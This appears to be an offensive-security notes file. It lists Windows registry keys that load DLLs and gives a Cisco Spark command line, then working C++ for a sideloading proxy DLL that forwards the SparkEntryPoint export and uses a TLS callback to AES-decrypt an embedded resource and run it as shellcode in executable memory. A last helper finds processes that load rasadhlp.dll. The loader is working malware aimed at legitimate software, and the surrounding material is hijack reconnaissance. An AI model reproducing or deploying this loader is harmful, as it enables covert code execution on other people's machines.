# helloo


```
HKLM\SOFTWARE\Microsoft\Rpc\Extensions\NdrOleExtDLL  
HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\AutodialDLL


HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Callout

HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000001\LibraryPath

%SystemRoot%\system32\napinsp.dll


HKLM\System\CurrentControlSet\Services\afunix\Parameters\Winsock\HelperDllName

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\PolicyExtensions

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\PolicyExtensions




HKLM\System\CurrentControlSet\Control\SecurityProviders\SecurityProviders

HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CertDllOpenStoreProv\#16

HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CertDllOpenStoreProv\Ldap

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\IconServiceLib

HKLM\System\CurrentControlSet\Control\DevQuery\8\DllName

Command line:	"C:\Program Files\DisplayFusion\DisplayFusionHookApp64.exe" "16204" "854308" "133716" "263438" "65764" "65782" "01979e14-4c15-759a-8723-ecbf4bd5575c" "C:\Program Files\DisplayFusion\Hooks\AppHook64_34BEB801-B89B-4098-B87D-033C699DC5EB.dll" "DisplayFusion" "Software\Binary Fortress Software\DisplayFusion" "Software\Binary Fortress Software\DisplayFusion\Session\3" "1" "110" "1" "1"

HKLM\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Windows.UI.Core.CoreWindow\DllPath
```
```
"C:\Users\windef\AppData\Local\Programs\Cisco Spark\CiscoCollabHost.exe" "C:\Users\windef\AppData\Local\Programs\Cisco Spark" spark-windows-app.dll /Hosted=true "C:\Users\windef\AppData\Local\Programs\Cisco Spark\CiscoCollabHost.exe"

```
```
#include "pch.h"
#include <windows.h>
#include <iostream>
#include <bcrypt.h>
#include "resource.h"

#pragma comment(lib, "bcrypt.lib")

#pragma comment(linker, "/export:SparkEntryPoint=spark-windows-appp.SparkEntryPoint")


HMODULE g_hModule = NULL;

PUCHAR AESDecrypt(BYTE* data, DWORD size, BYTE* keyss, DWORD sizeKey, DWORD& outSize) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    PUCHAR pbKeyObj = nullptr, pbOut = nullptr;
    DWORD cbKeyObj = 0, cbRes = 0;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return nullptr;

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC), 0)))
        goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj,
        sizeof(cbKeyObj), &cbRes, 0)))
        goto cleanup;

    pbKeyObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);
    if (!pbKeyObj) goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey,
        pbKeyObj, cbKeyObj, keyss, sizeKey, 0)))
        goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, data, size, NULL, NULL, 0,
        NULL, 0, &outSize, BCRYPT_BLOCK_PADDING)))
        goto cleanup;

    pbOut = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, outSize);
    if (!pbOut) goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, data, size, NULL, NULL, 0,
        pbOut, outSize, &outSize, BCRYPT_BLOCK_PADDING))) {
        HeapFree(GetProcessHeap(), 0, pbOut);
        pbOut = nullptr;
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (pbKeyObj) HeapFree(GetProcessHeap(), 0, pbKeyObj);
    return pbOut;
}


void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved);
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback")
#pragma const_seg(".CRT$XLB")
EXTERN_C const PIMAGE_TLS_CALLBACK _tls_callback = TLSCallbacks;
#pragma const_seg()

void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
{
    static bool once = false;
    if (!once && dwReason == DLL_PROCESS_ATTACH) {
        once = true;
        MessageBoxW(NULL, L"TLS Callback before main :)", L"dZkyXj - Debugger Owned!", MB_OK);
        

        HMODULE hMod = (HMODULE)DllHandle;

        HRSRC hRsrc = FindResourceW(hMod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
        if (!hRsrc) return;

        HGLOBAL hGRsrc = LoadResource(hMod, hRsrc);
        if (!hGRsrc) return;

        BYTE* pData = (BYTE*)LockResource(hGRsrc);
        DWORD dwSize = SizeofResource(hMod, hRsrc);
        if (!pData || !dwSize) return;

        HRSRC hRsrc1 = FindResourceW(hMod, MAKEINTRESOURCE(IDR_RCDATA2), RT_RCDATA);
        if (!hRsrc1) return;

        HGLOBAL hGRsrc1 = LoadResource(hMod, hRsrc1);
        if (!hGRsrc1) return;

        BYTE* pData1 = (BYTE*)LockResource(hGRsrc1);
        DWORD dwSize1 = SizeofResource(hMod, hRsrc1);
        if (!pData1 || !dwSize1) return;

        BYTE* keyss = (BYTE*)HeapAlloc(GetProcessHeap(), 0, dwSize1);
        if (!keyss) return;
        memcpy(keyss, pData1, dwSize1);

        DWORD outSize = 0;
        BYTE* decrypted = AESDecrypt(pData, dwSize, keyss, dwSize1, outSize);

        HeapFree(GetProcessHeap(), 0, keyss);

        if (decrypted) {
            MessageBoxW(NULL, L"Shell decrypted OK", L"Debug", MB_OK);

            LPVOID shell = VirtualAlloc(NULL, outSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (shell) {
                

                memcpy(shell, decrypted, outSize);

                //wchar_t msg[256];
                //swprintf(msg, 256, L"[DEBUG] Shellcode allocated at: 0x%p", shell);
                //MessageBoxW(NULL, msg, L"Shellcode Debug", MB_OK);
                HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shell, NULL, 0, NULL);
                if (hThread) CloseHandle(hThread);
            }
            HeapFree(GetProcessHeap(), 0, decrypted);
        }

    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <iostream>
#include <string>

void FindProcessesLoadingDLL(const std::wstring& dllName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };

    if (Process32First(hSnapshot, &pe32)) {
        do {
            HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
            if (hModuleSnap == INVALID_HANDLE_VALUE) continue;

            MODULEENTRY32 me32 = { sizeof(MODULEENTRY32) };
            if (Module32First(hModuleSnap, &me32)) {
                do {
                    std::wstring moduleName(me32.szModule);
                    if (_wcsicmp(moduleName.c_str(), dllName.c_str()) == 0) {
                        std::wcout << L"[+] Process " << pe32.szExeFile << L" (PID: " << pe32.th32ProcessID << L") has loaded " << dllName << std::endl;
                    }
                } while (Module32Next(hModuleSnap, &me32));
            }
            CloseHandle(hModuleSnap);
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
}

int wmain()
{
    std::wstring dllToFind = L"rasadhlp.dll"; // hoặc L"AutodialDLL.dll" nếu bạn có tên chính xác
    FindProcessesLoadingDLL(dllToFind);
    return 0;
}

```
